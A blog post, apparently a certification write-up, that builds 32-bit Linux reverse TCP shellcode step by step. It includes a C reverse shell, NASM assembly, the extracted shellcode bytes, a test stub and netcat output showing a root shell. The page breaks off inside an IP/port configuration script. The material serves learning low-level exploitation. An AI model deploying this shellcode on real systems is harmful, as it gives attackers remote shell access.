<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Brett Lischalk | SLAE Problem 2: Reverse TCP Shellcode</title>
  <meta name="description" content="A nice walkthrough of creating a reverse shellcode from scratch">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:title" content="SLAE Problem 2: Reverse TCP Shellcode">
  <meta property="og:type" content="website">
  <meta property="og:url" content="http://localhost:4000/posts/slae-problem-2-reverse-tcp-shellcode">
  <meta property="og:description" content="A nice walkthrough of creating a reverse shellcode from scratch">
  <meta property="og:site_name" content="Brett Lischalk">
  <meta property="og:image" content="http://localhost:4000/assets/og-image.jpg">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:url" content="http://localhost:4000/posts/slae-problem-2-reverse-tcp-shellcode">
  <meta name="twitter:title" content="SLAE Problem 2: Reverse TCP Shellcode">
  <meta name="twitter:description" content="A nice walkthrough of creating a reverse shellcode from scratch">
  <meta name="twitter:image" content="http://localhost:4000/assets/og-image.jpg">

  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
  <link href="http://localhost:4000/feed.xml" type="application/rss+xml" rel="alternate" title="Brett Lischalk Last 10 blog posts" />

  
    <link type="text/css" rel="stylesheet" href="/assets/dark.css">
  
</head>

<body>
  <main role="main">
    <div class="grid grid-centered">
      <div class="grid-cell">
        <nav class="header-nav reveal">
  <a href="/" class="header-logo" title="Brett Lischalk">Brett Lischalk</a>
  <ul class="header-links">
    
      <li>
        <a href="/about" title="About me">
          <span class="icon icon-android-person"></span>
        </a>
      </li>
    
    
      <li>
        <a href="https://twitter.com/blischalk" target="_blank" title="Twitter">
          <span class="icon icon-social-twitter"></span>
        </a>
      </li>
    
    
    
      <li>
        <a href="https://github.com/blischalk" target="_blank" title="GitHub">
          <span class="icon icon-social-github"></span>
        </a>
      </li>
    
    
    
    
      <li>
        <a href="https://www.linkedin.com/in/brett-lischalk-3104537" target="_blank" title="LinkedIn">
          <span class="icon icon-social-linkedin"></span>
        </a>
      </li>
    
    
    
      <li>
        <a href="mailto:brett@brettlischalk.com" target="_blank" title="Email">
          <span class="icon icon-at"></span>
        </a>
      </li>
    
    
      <li>
        <a href="/feed.xml" target="_blank" title="RSS">
          <span class="icon icon-social-rss"></span>
        </a>
      </li>
    
  </ul>
</nav>

        <article class="article reveal">
          <header class="article-header">
            <h1>SLAE Problem 2: Reverse TCP Shellcode</h1>
            <div class="article-list-footer">
              <span class="article-list-date">
                December 20, 2016
              </span>
              <span class="article-list-divider">-</span>
              <span class="article-list-minutes">
                
                
                  12 minute read
                
              </span>
              <span class="article-list-divider">-</span>
              <div class="article-list-tags">
                
                  <a href="/tag/asm">asm</a>
                
                  <a href="/tag/shellcode">shellcode</a>
                
                  <a href="/tag/c">c</a>
                
              </div>
            </div>
          </header>

          <div class="article-content">
            <h1 id="assignment-2">Assignment 2<a id="sec-1" name="sec-1"></a></h1>

<p>This blog post has been created for completing the requirements for the SecurityTube
Linux Assembly Expert certification:
<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert"><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></a></p>

<p>Student ID: SLAE-824</p>

<h2 id="requirements">Requirements<a id="sec-1-1" name="sec-1-1"></a></h2>

<ul>
  <li>Create a Shell Reverse TCP shellcode
    <ul>
      <li>Reverse connects to configured IP and PORT</li>
      <li>Execs Shell on successful connection</li>
    </ul>
  </li>
  <li>IP and Port should be easily configurable</li>
</ul>

<h2 id="strategy">Strategy<a id="sec-1-2" name="sec-1-2"></a></h2>

<p>My approach to building a tcp reverse shell shellcode will be to:</p>

<ul>
  <li>Build off of our TCP bind shell developed in <a href="http://www.brettlischalk.com/posts/slae-problem-1-tcp-bind-shell-shellcode">Assignment 1</a> of the SLAE</li>
  <li>Modify the C program to call <code class="highlighter-rouge">connect</code> instead of <code class="highlighter-rouge">bind</code>, <code class="highlighter-rouge">listen</code>, and <code class="highlighter-rouge">accept</code></li>
  <li>Analyze the C program system calls to see how the program interacts with the kernel to accomplish its tasks</li>
  <li>Lookup the system calls and see what arguments and structures they take</li>
  <li>Attempt to write some assembly that calls the same system calls in the same order with the same arguments as the C program does</li>
  <li>Debug issues as of course there will be :)</li>
</ul>

<h2 id="the-source-code">The Source Code<a id="sec-1-3" name="sec-1-3"></a></h2>

<p>The source code and tools referenced in this article can be found <a href="https://github.com/blischalk/slae/tree/master/exercise2">here</a></p>

<h2 id="the-c-progam">The C progam<a id="sec-1-4" name="sec-1-4"></a></h2>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cp">#include &lt;stdio.h&gt;
</span>    <span class="cp">#include &lt;netinet/in.h&gt;
</span>    <span class="cp">#define PORT 4444
</span>    
    <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// Create a socket
</span>      <span class="kt">int</span> <span class="n">lsock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    
      <span class="c1">// Setup servr side config struct
</span>      <span class="c1">// We configure:
</span>      <span class="c1">// The family:IPv4
</span>      <span class="c1">// The interface: 127.0.0.1 (Loopback)
</span>      <span class="c1">// The port: port#
</span>      <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">config</span><span class="p">;</span>
      <span class="n">config</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
      <span class="n">config</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>
      <span class="c1">// The htons() function converts the
</span>      <span class="c1">// unsigned short integer hostshort from host byte
</span>      <span class="c1">// order to network byte order.
</span>      <span class="n">config</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
    
      <span class="c1">// Connect to listening server
</span>      <span class="kt">int</span> <span class="n">csock</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">lsock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">config</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">config</span><span class="p">));</span>
    
      <span class="c1">// Redirect stdin, stdout, and stderror
</span>      <span class="n">dup2</span><span class="p">(</span><span class="n">lsock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
      <span class="n">dup2</span><span class="p">(</span><span class="n">lsock</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
      <span class="n">dup2</span><span class="p">(</span><span class="n">lsock</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    
      <span class="c1">// Execute a shell
</span>      <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="p">};</span></code></pre></figure>

<h2 id="analysis-of-the-c-progam">Analysis of the C progam<a id="sec-1-5" name="sec-1-5"></a></h2>

<p>Let’s compile our program with <code class="highlighter-rouge">gcc reversetcpshell.c -o reversetcpshell</code>.
Next, lets start Netcat listening for a connection using <code class="highlighter-rouge">nc -nlvp 4444</code>.
Now that we have Netcat waiting for a connection we can go ahead and
execute our reverse tcp shell with <code class="highlighter-rouge">./reversetcpshell</code>. If we look over
at our Netcat terminal we will see that we have a received a connection
and been presented with a shell!</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">    root@blahblah:~/shared/SLAE/slae/exercise2# nc <span class="nt">-nlvp</span> 4444
    listening on <span class="o">[</span>any] 4444 ...
    connect to <span class="o">[</span>127.0.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 37260
    <span class="nb">ls
    </span>README.org
    reversetcpshell
    reversetcpshell.c</code></pre></figure>

<p>Once again, if we use <code class="highlighter-rouge">strace ./reversetcpshell</code> when starting the reverse
shell we can see the system calls being made:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">    socket<span class="o">(</span>PF_INET, SOCK_STREAM, IPPROTO_IP<span class="o">)</span> <span class="o">=</span> 3
    dup2<span class="o">(</span>3, 0<span class="o">)</span>                              <span class="o">=</span> 0
    dup2<span class="o">(</span>3, 1<span class="o">)</span>                              <span class="o">=</span> 1
    dup2<span class="o">(</span>3, 2<span class="o">)</span>                              <span class="o">=</span> 2
    connect<span class="o">(</span>3, <span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET, <span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span>4444<span class="o">)</span>, <span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">"127.0.0.1"</span><span class="o">)}</span>, 16<span class="o">)</span> <span class="o">=</span> 0
    execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, <span class="o">[</span>0], <span class="o">[</span>/<span class="k">*</span> 0 vars <span class="k">*</span>/]<span class="o">)</span>  <span class="o">=</span> 0</code></pre></figure>

<p>Interestingly, our c program is shorter and the amount of system calls
that we need seems to have decreased. It seems as though our reverse
tcp shellcode could be as basic as using <code class="highlighter-rouge">socket, dup2, connect, and execve</code>.
Essentially we do not need to worry about <code class="highlighter-rouge">bind, listen, or accept</code> and
just need to learn about 1 system call we haven’t used before; <code class="highlighter-rouge">connect</code>.</p>

<p>Ok, what can we learn about connect?</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="kt">int</span> <span class="n">connect</span><span class="p">(</span><span class="kt">int</span> <span class="n">socket</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">address</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">address_len</span><span class="p">);</span></code></pre></figure>

<p>If we remember the function signature of bind:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="kt">int</span> <span class="n">bind</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span></code></pre></figure>

<p>We see that they are exactly the same! The only difference is that when
we define the sockaddr structure we will want to specify the IP of the
machine that we want to connect back to instead of the 0.0.0.0 IP we
specified in our bindshell.</p>

<p>Cool! Lets write some assembly…</p>

<h2 id="assembly-take-1">Assembly: Take 1<a id="sec-1-6" name="sec-1-6"></a></h2>

<p>If we remember our research on  creating our bindshell,
the system call for <code class="highlighter-rouge">SYS_CONNECT</code> was 3.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cp">#define SYS_CONNECT 3   </span><span class="cm">/* sys_connect(2)   */</span></code></pre></figure>

<p>So in theory, if we modify our assembly to call 3 instead of 2 e.g
<code class="highlighter-rouge">connect</code> instead of <code class="highlighter-rouge">bind</code>, remove unnecessary system calls, and make
sure that we redirect stdin,stdout,and stderror after making our
connection, we should be in good shape. Lets give that a shot:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">    <span class="kr">global</span> <span class="n">_start</span>
    
    <span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
      <span class="n">_start</span><span class="o">:</span>
        <span class="c">;; Create a socket</span>
        <span class="c">;; int socketcall(int call, unsigned long *args);</span>
        <span class="c">;; int socket(int domain, int type, int protocol);</span>
        <span class="c">;; #define SYS_SOCKET 1   /* sys_socket(2)    */</span>
        <span class="c">;; Use socketcall to call down to socket</span>
        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">; socketcall syscall</span>
        <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
        <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x1</span> <span class="c">; sys_socket syscall number</span>
    
        <span class="c">;; Put the socket() args on the stack</span>
        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
        <span class="k">push</span> <span class="n">ecx</span> <span class="c">; Protocol INADDR_ANY Accept on any interface 0x00000000</span>
        <span class="k">push</span> <span class="n">ebx</span> <span class="c">; SOCK_STREAM is the type of socket 1</span>
    
        <span class="k">push</span> <span class="mh">0x2</span> <span class="c">; Domain af_inet sets protocol family to ip protocol 2</span>
    
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">; save pointer to args for the socket() call</span>
        <span class="k">int</span> <span class="mh">0x80</span> <span class="c">; call sys_socket</span>
    
        <span class="c">; save the returned listening socket file descriptor</span>
        <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>
        <span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
    
        <span class="c">;; Connect on the socket</span>
        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">; socketcall syscall</span>
    
        <span class="c">;; Start building the sockaddr_in structure</span>
        <span class="c">;; Since the structure is laid out as:</span>
        <span class="c">;; sin_family, sin_port, sin_addr</span>
        <span class="c">;; we need to push the values onto the stack</span>
        <span class="c">;; in reverse order</span>
        <span class="c">;; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</span>
        <span class="c">;; sin_addr= inet_addr("127.0.0.1) = 0x0100007f</span>
        <span class="c">;; loop back addr is 127.0.0.1</span>
        <span class="c">;; this translates to 0x0100007f</span>
        <span class="c">;; we don't want to have null bytes 0x00</span>
        <span class="c">;; so we add 0x01010101 to our address</span>
        <span class="c">;; move it into a register</span>
        <span class="c">;; and then subtract</span>
        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="mh">0x02010180</span>
        <span class="k">sub</span> <span class="n">ecx</span><span class="p">,</span> <span class="mh">0x01010101</span>
        <span class="k">push</span> <span class="n">ecx</span> <span class="c">; inet_addr("127.0.0.1) = 0x0100007f</span>
    
        <span class="c">;; 4444 is 0x115c in little endian. Network byte order is</span>
        <span class="c">;; Big endian so we swap the byte ordering</span>
        <span class="k">push</span> <span class="n">word</span> <span class="mh">0x5c11</span> <span class="c">; sin_port=4444 (network byte order)</span>
        <span class="c">;; bl is sys_connect syscallnumber 0x3</span>
        <span class="c">;; prior to the next instruction</span>
        <span class="c">;; subtract one to bring it to 0x2</span>
        <span class="c">;; which is what AF_INET represents</span>
        <span class="k">inc</span> <span class="n">ebx</span>
        <span class="k">push</span> <span class="n">word</span> <span class="n">bx</span>     <span class="c">; sin_family=AF_INET (0x2)</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>     <span class="c">; move pointer to sockaddr_in structure</span>
    
    
        <span class="c">;; In the initial code we use sizeof to derive the addrlen</span>
        <span class="c">;; If we print the results of that we get 0x10 which is 16 bytes</span>
        <span class="k">push</span> <span class="mh">0x10</span> <span class="c">;addrlen=16</span>
        <span class="k">push</span> <span class="n">ecx</span>  <span class="c">;sockaddr_in struct pointer</span>
        <span class="k">push</span> <span class="n">edi</span>  <span class="c">;sockfd</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">;save pointer to connect() args</span>
    
        <span class="c">;; Bring ebx back to sys_call # 3 for connect()</span>
        <span class="k">inc</span> <span class="n">ebx</span>
        <span class="k">int</span> <span class="mh">0x80</span> <span class="c">; call sys_connect</span>
    
        <span class="c">;; call dup2 for stdin, stdout, and stderr in a loop</span>
        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
        <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x2</span> <span class="c">;loop counter</span>
        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
      <span class="n">dup2</span><span class="o">:</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span> <span class="c">;dup2</span>
        <span class="k">int</span> <span class="mh">0x80</span>
        <span class="k">dec</span> <span class="n">ecx</span>
        <span class="k">jns</span> <span class="n">dup2</span>
    
        <span class="c">;; Call execve</span>
        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span> <span class="c">;execve</span>
        <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
        <span class="k">push</span> <span class="n">ebx</span>
        <span class="k">push</span> <span class="mh">0x68732f2f</span> <span class="c">;"sh//"</span>
        <span class="k">push</span> <span class="mh">0x6e69622f</span> <span class="c">;"nib/"</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>
        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
        <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>
        <span class="k">int</span> <span class="mh">0x80</span></code></pre></figure>

<p>When we compile the above shellcode using the compile.sh script below:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">    <span class="c">#!/bin/bash</span>
    <span class="nb">echo</span> <span class="s1">'[+] Assembling with Nasm ... '</span>
    nasm <span class="nt">-f</span> elf32 <span class="nt">-o</span> <span class="nv">$1</span>.o <span class="nv">$1</span>.nasm
    
    <span class="nb">echo</span> <span class="s1">'[+] Linking ...'</span>
    ld <span class="nt">-o</span> <span class="nv">$1</span> <span class="nv">$1</span>.o
    
    <span class="nb">echo</span> <span class="s1">'[+] Done!'</span></code></pre></figure>

<p><code class="highlighter-rouge">root@blahblah:~/shared/SLAE/slae/exercise2# ./compile.sh reverseshellasm</code></p>

<p>Setup a netcat listener with <code class="highlighter-rouge">nc -nlvp 4444</code> and run the shellcode using:</p>

<p><code class="highlighter-rouge">root@blahblah:~/shared/SLAE/slae/exercise1# ./reverseshellasm</code></p>

<p>We receive:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">    <span class="c">#!/bin/bash</span>
    root@blahblah:~/shared/SLAE/slae/exercise2# nc <span class="nt">-nlvp</span> 4444
    listening on <span class="o">[</span>any] 4444 ...
    connect to <span class="o">[</span>127.0.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 37306
    id
    <span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span></code></pre></figure>

<p>Excellent! Lets dump the bytes:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">    root@funos:~/shared/SLAE/slae/exercise2# objdump <span class="nt">-d</span> ./reverseshellasm|grep <span class="s1">'[0-9a-f]:'</span>| <span class="se">\</span>
    <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'file'</span>|cut <span class="nt">-f2</span> <span class="nt">-d</span>:|cut <span class="nt">-f1-6</span> <span class="nt">-d</span><span class="s1">' '</span>|tr <span class="nt">-s</span> <span class="s1">' '</span>|<span class="se">\</span>
    tr <span class="s1">'\t'</span> <span class="s1">' '</span> |sed <span class="s1">'s/ $//g'</span>|sed <span class="s1">'s/ /\\x/g'</span>|<span class="se">\</span>
    paste <span class="nt">-d</span> <span class="s1">''</span> <span class="nt">-s</span> |sed <span class="s1">'s/^/"/'</span>|sed <span class="s1">'s/$/"/g'</span>
    <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1"</span>
    <span class="s2">"</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01"</span>
    <span class="s2">"</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89"</span>
    <span class="s2">"</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0"</span>
    <span class="s2">"</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
    <span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span></code></pre></figure>

<p>and try it in our shellcode.c stub program.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cp">#include&lt;stdio.h&gt;
</span>    <span class="cp">#include&lt;string.h&gt;
</span>    
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
    <span class="s">"</span><span class="se">\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x01\x01</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x02\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80</span><span class="s">"</span><span class="p">;</span>
    
    
    <span class="n">main</span><span class="p">()</span>
    <span class="p">{</span>
    
      <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
    
      <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
    
      <span class="n">ret</span><span class="p">();</span>
    
    <span class="p">}</span></code></pre></figure>

<p><code class="highlighter-rouge">gcc shellcode.c -o shellcode</code></p>

<p>It still works at a length of 96 bytes:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">    root@blahblah:~/shared/SLAE/slae/exercise2# nc <span class="nt">-nlvp</span> 4444
    listening on <span class="o">[</span>any] 4444 ...
    connect to <span class="o">[</span>127.0.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 37310
    id
    <span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span></code></pre></figure>

<p>So once again, we can always go back and optimize length but the
last thing we need to do is write another wrapper program which
will allow us to set the IP and PORT easily. Lets use our previous
python script as a starting point. We need to remember though that
whatever IP address a user enters that we want to increment each
octet so the math in the assembly works out:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python">    <span class="c">#!/usr/bin/python</span>
    
    <span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span><span class="n">socket</span>
    
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
      <span class="k">print</span> <span class="s">"Fail!"</span>
    
    <span class="n">ipbts</span>           <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
    <span class="n">incremented</span>     <span class="o">=</span> <span class="p">[</span><span class="n">b</span><span class="o">+</span><span class="mi">1</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">ipbts</span><span class="p">]</span>
    <span class="n">ip</span>              <span class="o">=</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">"</span><span class="se">\\</span><span class="s">x"</span> <span class="o">+</span> <span class="n">format</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="s">'x'</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">incremented</span><span class="p">])</span>
    <span class="n">port_number</span>     <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">bts</span>             <span class="o">=</span> <span class="p">[</span><span class="n">port_number</span> <span class="o">&gt;&gt;</span> <span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">24</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">0</span><span class="p">)]</span>
    <span class="n">filtered</span>        <span class="o">=</span> <span class="p">[</span><span class="n">b</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">bts</span> <span class="k">if</span> <span class="n">b</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">]</span>
